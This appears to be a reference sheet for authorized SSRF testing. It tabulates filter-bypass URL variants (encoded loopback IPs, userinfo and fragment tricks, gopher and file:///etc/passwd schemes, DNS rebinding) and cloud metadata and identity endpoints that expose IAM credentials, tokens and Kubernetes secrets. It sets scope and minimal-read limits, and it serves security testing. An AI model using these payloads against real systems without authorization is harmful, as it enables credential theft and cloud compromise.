# SSRF variant set and metadata endpoint matrix

Reference for `ssrf-metadata`. Run the variant table **once**, in order, and record per-variant outcome; consult the matrix only for the platform the asset actually is. Every destination here is reached **through the authorized application's own fetch**, never by your container talking to a third-party host directly.

## A. Reach oracles (cheapest first)

| Oracle | How | What it proves |
|---|---|---|
| Reflected body | URL param whose fetch result renders in the response | Full read: strongest |
| Status/length differential | Valid internal target versus an unroutable one; compare status and byte length | Blind fetch exists |
| Error string | Client library name in the error (`java.net.ConnectException`, `urllib3`, `requests`, `OkHttp`, `fetch failed`) | Which parser you are fighting, plus a version tell |
| Timing | Connect to a closed port (fast refusal) versus an open one (full response), versus a firewalled one (timeout) | Blind reach, weakest; needs repeats |
| Out-of-band | Operator-approved callback; watch for the request and any second-order hit | Fetch plus egress position |

## B. Parser and filter variants

Run as one pass; note which layer rejected each (application validation, egress proxy, client-library scheme rules).

| Class | Variants |
|---|---|
| Loopback | `http://127.0.0.1/`, `http://127.1/`, `http://127.0.0.1:PORT/`, `http://0/`, `http://0.0.0.0/`, `http://localhost/`, `http://LOCALHOST/` (case), `http://localh0st/` |
| Encoded IP | decimal `http://2130706433/`, hex `http://0x7f000001/`, octal `http://0177.0.0.1/`, mixed `http://127.1.1.1/` |
| IPv6 | `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `http://[0:0:0:0:0:ffff:7f00:1]/`, platform link-local IPv6 (see matrix) |
| Link-local | `http://169.254.169.254/`, `http://169.254.170.2/` (ECS), `http://100.100.100.200/` (Alibaba), `http://169.254.169.254.nip.io/`, `http://<decimal-of-169.254.169.254>/` |
| RFC1918 | only the specific internal host the objective names; never a range |
| Trust-boundary | `http://allowed.com@169.254.169.254/`, `http://169.254.169.254#allowed.com`, `http://169.254.169.254?allowed.com`, `http://allowed.com.evil-range/` (suffix confusion), `http://evil-range/\.allowed.com` |
| Scheme | `file:///etc/passwd`, `gopher://`, `dict://`, `ftp://`, `data://`, jar/`netdoc:` on Java clients, protocol-relative `//169.254.169.254/` |
| Indirection | 30x from an approved host (test re-validation after redirect), DNS rebinding (TTL 0/1, alternating answers), wildcard resolvers (`*.nip.io`, `sslip.io`), CNAME you control pointing at a literal |
| Encoding | uppercase host, trailing dot `http://169.254.169.254./`, whitespace, double slash `http:////169.254.169.254/`, `http:/` and `http:/169.254.169.254`, IPv4-in-IPv6 |

Per-client tells: Java `URL` versus OkHttp versus `HttpClient` differ on userinfo, trailing dot, and redirect re-validation. Node `new URL` versus `fetch` differ on protocol-relative and on hostname normalisation. curl-family differs on `file:`/`gopher:` and on `--proto-redir`. Identify the client from the error string, then pick the class of edge that client is known to get wrong instead of spraying all of them.

## C. Metadata and workload-identity endpoints

| Platform | Endpoint and preconditions | What the smallest read looks like |
|---|---|---|
| AWS EC2/Lambda | IMDSv1 `GET http://169.254.169.254/latest/meta-data/`; IMDSv2 requires `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds` and the token as a header on subsequent GETs. IPv6: `http://[fd00:ec2::254]/` same paths. User data `.../latest/user-data`. Role creds `.../latest/meta-data/iam/security-credentials/` then the role name | Directory listing of `meta-data/` plus the role name; do not read the key fields |
| AWS ECS task | `http://169.254.170.2/v2/` and `.../v2/credentials/<id>`, plus the relative-path form the agent appends (`http://169.254.170.2$PATH` when `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` is set) | Task role ID and the presence of the credentials path |
| Azure VM/App Service | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` **with header `Metadata: true`**; managed identity `.../metadata/identity/oauth2/token?resource=<uri>&api-version=...`; App Service also answers `http://127.0.0.1:40342/identity/token` | Instance metadata shape (compute name, resource group); identity token: class and expiry only |
| GCP / GKE | `http://metadata.google.internal/computeMetadata/v1/` or `http://169.254.169.254/computeMetadata/v1/` **with header `Metadata-Flavor: Google`**; `.../instance/service-accounts/default/token`; `.../project/project-id`, `.../global/instance-id` (numeric, no `v1` on the legacy path) | Project id and the SA email; token by reference |
| OpenStack / cloud-init shapes | `http://169.254.169.254/openstack/latest/meta_data.json`, `http://169.254.169.254/latest/meta-data/` (cloud-init's EC2-compat path), `http://169.254.169.254/user-data/` | The `uuid`/`hostname` fields |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | Region and instance id |
| Oracle OCI | `http://169.254.169.254/opc/v2/instance/` (v1 also exists; `authorization: true` header on some shapes) | Compartment/part of the instance document |
| Kubernetes node | `http://localhost:10255/` (read-only port, deprecated but seen live: `/pods`, `/healthz`), `https://localhost:10250/` (TLS-client authenticated; `/containerLogs`, `/runningpods` are the reason it matters) | `healthz` returning `ok` proves position |
| Kubernetes pod | in-pod SA token file `/var/run/secrets/kubernetes.io/serviceaccount/token`; API `https://kubernetes.default.svc/api/v1/namespaces/<ns>/secrets` needs that token | Token presence and namespace name; the token itself by reference |
| Service mesh / sidecar | Envoy admin `http://localhost:15000/config_dump`, `:15021/healthz/ready` (Istio), `:15000/stats` | Cluster/route names in the dump: internal service inventory |
| Vault agent / local secrets | `http://127.0.0.1:8200/v1/...`, `http://127.0.0.1:8100/v1/_ping` | The `_ping` answer proving an unauthenticated local Vault |
| Console/UI on host | `http://127.0.0.1:<k8s-dashboard/actuator/jenkins/...>/` — only the specific port named by the objective | A title string or a `Server` header |

Header-precondition matters for the write-up: if the client will not let you set `Metadata: true` or `Metadata-Flavor: Google`, that is a distinct finding shape (SSRF present, header forgery absent) and the honest negative to report.

## D. Filter-evasion outcomes to name in the report

- **Blocked at application validation**: same error for every variant, no outbound record — class closed for this input.
- **Blocked at egress proxy/network**: fetch started, connection refused or filtered — the finding is the network position plus the surviving variants.
- **Blocked by a scheme allowlist**: only `http(s)` accepted; report which non-`http` schemes the client would have honoured had it been reachable (from the error string).
- **Redirect not re-validated**: the bypass mechanism, stated as the redirect edge, with counts.
- **Hostname-only blocklist**: literal IPs bypass it; the finding is the string-not-resolution check.
